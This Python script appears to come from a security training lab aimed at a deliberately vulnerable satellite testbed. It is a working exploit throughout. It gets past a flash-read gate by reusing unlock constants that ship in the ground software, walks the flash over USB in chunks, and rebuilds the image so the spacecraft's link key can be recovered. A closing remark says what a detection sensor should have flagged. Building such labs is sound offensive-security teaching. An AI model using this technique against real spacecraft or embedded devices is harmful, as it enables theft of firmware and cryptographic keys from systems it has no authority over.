#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 08_flash_read_dump_usb.py -- read the spacecraft's flash out of it, over the
# same cable that commands it.
#
# The read path is gated, and the gate is two fixed numbers:
#
#     worker.cpp:
#       if (window_id != flash_window_id || unlock != flash_unlock_tag) {
#           telemetrySPPTransmitError("FLASH WINDOW LOCKED");
#
# Both constants ship inside the ground software (DEFAULT_FLASH_WINDOW_ID and
# DEFAULT_FLASH_UNLOCK_TAG in PWNSAT-C3's settings.py). A value that travels
# with every copy of the client is not a credential. It is an obstacle, and
# only to somebody who has not looked.
#
# Payload layout, read straight off the handler. Note the two endiannesses --
# the offset is little endian and the unlock tag is big endian, in the same
# six octets:
#
#     [0]    window_id
#     [1..2] offset      little endian
#     [3]    read_len
#     [4..5] unlock      big endian
#
# Expected: an image assembled out of the replies, and the link key somewhere
# inside it.

import argparse
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import FlatSat, TC_FLASH_READ, hexdump  # noqa: E402

# Straight out of PWNSAT-C3/backend/settings.py.
WINDOW_ID = 0xA5
UNLOCK_TAG = 0xC35A


def read_request(offset: int, length: int, *, window: int = WINDOW_ID,
                 unlock: int = UNLOCK_TAG) -> bytes:
    return bytes([window & 0xFF,
                  offset & 0xFF, (offset >> 8) & 0xFF,      # little endian
                  length & 0xFF,
                  (unlock >> 8) & 0xFF, unlock & 0xFF])     # big endian


TM_FLASH_READ = 0x0B


def flash_chunk(payload: bytes):
    """(offset, data) out of a FLASH_READ reply, or None if it is not one.

    The firmware answers on the same identifier it was asked on and puts a
    header of its own in front: spacecraft id, offset little endian, the
    number of octets copied, the octets, then a CRC-8 over them. Reading the
    whole payload as flash content picks up that header and the checksum as
    if they were data.
    """
    if len(payload) < 5:
        return None
    offset = payload[1] | (payload[2] << 8)
    n = payload[3]
    if len(payload) < 4 + n + 1:
        return None
    return offset, bytes(payload[4:4 + n])


def flash_replies(fsat, replies):
    """Only the answers to this command, in the order the board sent them.

    The board services its USB output on a 1 Hz tick, so a read window
    catches whatever was still in flight from earlier traffic as well: ping
    acknowledgements, navigation telemetry, sensor events. Taking every
    payload that arrives assembled those into the image and called it flash.
    """
    out = []
    for p in replies:
        if p.apid != TM_FLASH_READ or not p.payload:
            continue
        got = flash_chunk(fsat.plaintext(p))
        if got:
            out.append(got)
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--start", type=lambda x: int(x, 0), default=0x0000)
    ap.add_argument("--end", type=lambda x: int(x, 0), default=0x0400,
                    help="exclusive. Keep it small the first time")
    ap.add_argument("--chunk", type=int, default=64, help="octets per request")
    ap.add_argument("--window", type=lambda x: int(x, 0), default=WINDOW_ID)
    ap.add_argument("--unlock", type=lambda x: int(x, 0), default=UNLOCK_TAG)
    ap.add_argument("--cleartext", action="store_true",
                    help="the link is already downgraded (see attack 24)")
    ap.add_argument("--out", default=None, help="write the image here")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    print(f"[*] window=0x{args.window:02X} unlock=0x{args.unlock:04X}  "
          f"-- both read out of the ground software, not guessed")

    image = bytearray()
    with FlatSat(port=args.port, encrypt=not args.cleartext,
                 verbose=not args.quiet) as fsat:

        print("\n=== 1. one window, to see whether the gate opens at all ===")
        replies = fsat.send(TC_FLASH_READ,
                            read_request(args.start, args.chunk,
                                         window=args.window, unlock=args.unlock),
                            seq=1, listen=1.5)
        raw = [fsat.plaintext(p) for p in replies if p.payload]
        if any(b"LOCKED" in b for b in raw):
            print("[!] FLASH WINDOW LOCKED -- the window id or the unlock tag is wrong.")
            return 1
        body = flash_replies(fsat, replies)
        if not body:
            kinds = ", ".join(f"0x{p.apid:03X}" for p in replies) or "nothing"
            print(f"[!] no FLASH_READ reply came back (saw: {kinds}).")
            return 1
        print(hexdump(body[0][1][:64]))

        print(f"\n=== 2. walking 0x{args.start:04X}..0x{args.end:04X} ===")
        seq = 2
        offset = args.start
        stalled = 0
        while offset < args.end:
            replies = fsat.send(TC_FLASH_READ,
                                read_request(offset, args.chunk,
                                             window=args.window, unlock=args.unlock),
                                seq=seq, listen=1.5)
            seq = (seq + 1) & 0x3FFF
            chunks = flash_replies(fsat, replies)
            if not chunks:
                raw = [fsat.plaintext(p) for p in replies if p.payload]
                if any(b"OOB" in b for b in raw):
                    print(f"    0x{offset:04X}  past the end of the window")
                    break
                stalled += 1
                print(f"    0x{offset:04X}  no reply")
                if stalled >= 3:
                    print("    three in a row with nothing back; stopping here")
                    break
                offset += args.chunk
                continue

            stalled = 0
            delivered = 0
            for at, data in chunks:
                # Placed where the board says it came from, not appended in
                # arrival order, so a late reply lands at its own offset
                # instead of shifting everything after it.
                if len(image) < at + len(data):
                    image.extend(b"\x00" * (at + len(data) - len(image)))
                image[at:at + len(data)] = data
                delivered = max(delivered, at + len(data) - offset)

            if not args.quiet:
                shown = ", ".join(f"0x{a:04X}+{len(d)}" for a, d in chunks)
                print(f"    0x{offset:04X}  {shown}  (image {len(image)})")

            # Advance by what the board sent, not by what was asked for. It
            # caps a read at flash_read_max_bytes and reports the real count;
            # stepping by the request instead walks over whatever the cap left
            # behind, and those gaps come back as zeros that read like flash.
            offset += delivered if delivered > 0 else args.chunk

    print(f"\n[+] {len(image)} octets assembled.")
    if args.out:
        Path(args.out).write_bytes(bytes(image))
        print(f"[+] written to {args.out}")

    print("\nNext: run the key-recovery method from lab 2.1 against this image.\n"
          "This time it came off the board, not out of a repository.")
    print("\nWhat the sensor should have shown: one read is maintenance, a walk "
          "across offsets is somebody taking a copy.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
